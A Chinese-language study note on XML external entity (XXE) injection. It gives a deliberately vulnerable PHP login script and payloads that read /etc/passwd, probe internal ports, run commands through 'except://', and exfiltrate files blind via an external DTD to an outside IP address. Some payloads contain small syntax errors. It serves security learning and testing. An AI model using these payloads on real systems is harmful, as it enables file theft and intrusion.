---
{"dg-publish":true,"dg-path":"xiaodi/WEB攻防_XML&XXE安全.md","permalink":"/xiaodi/WEB攻防_XML&XXE安全/","title":"WEB攻防_XML&XXE安全"}
---

# XML
XML（eXtensible Markup Language，扩展标记语言）是一种用于描述和传输数据的标记语言。它是一种可扩展的文本格式，用来定义数据的结构和内容，通过标签对数据进行标记。XML的设计目标是简单、通用且易于与不同系统之间进行数据交换。

主要特点包括：

1. **自描述性**：XML文档包含了数据以及数据的结构信息，使得文档是自解释的。
2. **可扩展性**：可以根据需求定义自己的标签，不受预定义标签的限制。
3. **跨平台**：XML是纯文本格式，可以在不同的平台和系统之间无缝传输和共享。
4. **层次结构**：XML文件具有树状的层次结构，适合表示复杂的数据关系。

XML广泛用于数据传输、配置文件、文档存储、Web服务和跨平台应用程序之间的数据交换等领域。


# XXE漏洞

主要用于**文件读取**
## XML外部实体（XXE）注入漏洞

XML外部实体（XXE）注入是一种由于XML解析器在解析XML数据时不安全地处理外部实体而引发的安全漏洞。这种漏洞可以导致攻击者通过提交恶意构造的XML数据来访问服务器上的本地文件、执行远程代码、发起拒绝服务攻击（DoS）、甚至进一步入侵目标系统。

## XXE漏洞工作原理

XXE漏洞的核心问题在于XML文档类型定义（DTD）功能中的“外部实体”特性。外部实体允许XML在解析时引用外部资源，如本地文件或网络资源。如果XML解析器没有正确配置来禁用外部实体处理，那么攻击者可以构造恶意XML来滥用这一特性。

## XXE攻击示例

下面是一个典型的XXE攻击示例，通过读取服务器上敏感的文件（如`/etc/passwd`）：

```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<credentials>
  <username>&xxe;</username>
  <password>password123</password>
</credentials>
```

### 攻击过程：
1. **DTD声明**：`<!DOCTYPE root [...]>`定义了一个DTD，并在其中声明了一个名为`xxe`的外部实体。
2. **实体定义**：`<!ENTITY xxe SYSTEM "file:///etc/passwd">`定义了实体`xxe`，它的值是从服务器读取的`/etc/passwd`文件内容。
3. **实体引用**：`<username>&xxe;</username>`在XML中引用了该实体，导致解析时加载实体内容，结果是`<username>`标签的内容变成了服务器文件的内容。

## XXE攻击的危害

1. **文件泄露**：攻击者可以读取服务器上的任意文件，只要服务器用户有权限访问这些文件。常见的目标包括配置文件、密码文件、源代码等。
   
2. **远程代码执行**：在某些配置下，攻击者可以通过XXE注入来执行远程代码，比如通过`SYSTEM`实体请求远程URL，从而在受害者环境中执行未授权的操作。

3. **拒绝服务攻击**：恶意XML可以引用大量的外部实体或递归实体，导致解析器消耗过多资源，从而造成拒绝服务（DoS）攻击。

4. **服务器端请求伪造（SSRF）**：利用XXE，攻击者可以让服务器发送请求到内部网络的其他服务器，获取不应该暴露的数据或服务。

## 如何防范XXE漏洞

1. **禁用外部实体**：配置XML解析器禁用外部实体加载。这是防御XXE的核心方法。例如，在PHP中，可以通过`libxml_disable_entity_loader(true);`禁用外部实体加载。

2. **使用安全的解析库**：使用解析器的安全配置，或使用默认禁用外部实体的库。

3. **输入验证和清理**：对输入的XML数据进行严格的验证，过滤可能存在的恶意内容。

4. **最小化特权**：确保解析器运行在最低权限下，防止即使出现漏洞也不会导致敏感文件被读取。

5. **监控和审计**：实施监控和日志审计，检测异常的XML解析行为或访问模式。

通过正确配置解析器和严格的输入验证，可以有效防范XXE攻击，提高系统的整体安全性。

## 简单例子

其中登录代码：
```php
<?php
/**
* autor: c0ny1
* date: 2018-2-7
*/

$USERNAME = 'admin'; //账号
$PASSWORD = 'admin'; //密码
$result = null;

libxml_disable_entity_loader(false);
$xmlfile = file_get_contents('php://input');

try{
	$dom = new DOMDocument();
	$dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);
	$creds = simplexml_import_dom($dom);

	$username = $creds->username;
	$password = $creds->password;

	if($username == $USERNAME && $password == $PASSWORD){
		$result = sprintf("<result><code>%d</code><msg>%s</msg></result>",1,$username);
	}else{
		$result = sprintf("<result><code>%d</code><msg>%s</msg></result>",0,$username);
	}	
}catch(Exception $e){
	$result = sprintf("<result><code>%d</code><msg>%s</msg></result>",3,$e->getMessage());
}

header('Content-Type: text/html; charset=utf-8');
echo $result;
?>
```


![Pasted image 20240914100255.png](/img/user/picture/Pasted%20image%2020240914100255.png)

# 漏洞利用

## 文件读取
通过加载外部实体，利用file://、php://等伪协议读取本地文件
payload：
```php
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE creds[
<!ELEMENT userename ANY>
<!ELEMENT password ANY>
<!ENTITY xxe SYSTEM="file:///etc/passwd"]>
<creds>
    <username>&xxe</username>
    <password>test</password>
</creds>
```

## 内网探测

 利用xxe漏洞进行内网探测，如果端口开启，请求返回的时间会很快，如果端口关闭请求返回的时间会很慢
 //感觉不好用
 

探测22号端口是否开启

payload:
```php
<?xml version="1.0"?>
<!DOCTYPE creds[
<!ELEMENT userename ANY>
<!ELEMENT password ANY>
<!ENTITY xxe SYSTEM="http://127.0.0.1:22"]>
<creds>
    <username>&xxe</username>
    <password>test</password>
</creds>
```


## 命令执行
**利用xxe漏洞可以调用except://伪协议调用系统命令**

payload:
```php
<?xml version="1.0"?>
<!DOCTYPE creds[
<!ELEMENT userename ANY>
<!ELEMENT password ANY>
<!ENTITY xxe SYSTEM="except://id"]>
<creds>
    <username>&xxe</username>
    <password>test</password>
</creds>
```



## 带外测试(主要用于漏洞检测)：
```xml
<?xml version="1.0" ?>
<!DOCTYPE test [
<!ENTITY % file SYSTEM "http://9v57ll.dnslog.cn">
%file;
]>
<user><username>&send;</username><password>xiaodi</password></user>
```

## 外部引用实体dtd：
```xml
<?xml version="1.0" ?>
<!DOCTYPE test [
<!ENTITY % file SYSTEM "http://127.0.0.1:8081/xiaodi.dtd">
%file;
]>
<user><username>&send;</username><password>xiaodi</password></user>




xiaodi.dtd
<!ENTITY send SYSTEM "file:///d:/1.txt">
```


## 无回显读文件
```xml
<?xml version="1.0"?>
<!DOCTYPE ANY[
<!ENTITY % file SYSTEM "file:///d:/1.txt">
<!ENTITY % remote SYSTEM "http://47.94.236.117/test.dtd">
%remote;
%all;
]>
<root>&send;</root>
test.dtd
<!ENTITY % all "<!ENTITY send SYSTEM 'http://47.94.236.117/get.php?file=%file;'>">
```


## 其他玩法（协议）-见参考地址

https://www.cnblogs.com/20175211lyz/p/11413335.html



# 黑盒测试

1、获取Content-Type或数据类型为xml时，尝试进行xml语言payload进行测试

2、不管获取的Content-Type类型或数据传输类型，均可尝试修改后提交测试xxe

流程：功能分析-前端提交-源码&抓包-构造Paylod测试

更改请求数据格式：`Content-Type:xml`
```xml
<?xml version = "1.0"?>
<!DOCTYPE ANY [
<!ENTITY f SYSTEM "file:///etc/passwd">
]>
<x>&f;</x>
```


# 白盒测试

审计流程：

1、漏洞函数simplexml_load_string
2、pe_getxml函数调用了漏洞函数
3、wechat_getxml调用了pe_getxml
4、notify_url调用了wechat_getxml
访问notify_url文件触发wechat_getxml函数,构造Paylod测试

先尝试读取文件，无回显后带外测试：
```xml
<?xml version="1.0" ?>
<!DOCTYPE test [
<!ENTITY % file SYSTEM "http://1uwlwv.dnslog.cn">
%file;
]>
<root>&send;</root>

```

然后带外传递数据解决无回显：
```xml
<?xml version="1.0"?>
<!DOCTYPE ANY[
<!ENTITY % file SYSTEM "file:///d:/1.txt">
<!ENTITY % remote SYSTEM "http://47.94.236.117/test.dtd">
%remote;
%all;
]>
<root>&send;</root>






test.dtd：

<!ENTITY % all "<!ENTITY send SYSTEM 'http://47.94.236.117/get.php?file=%file;'>">

```




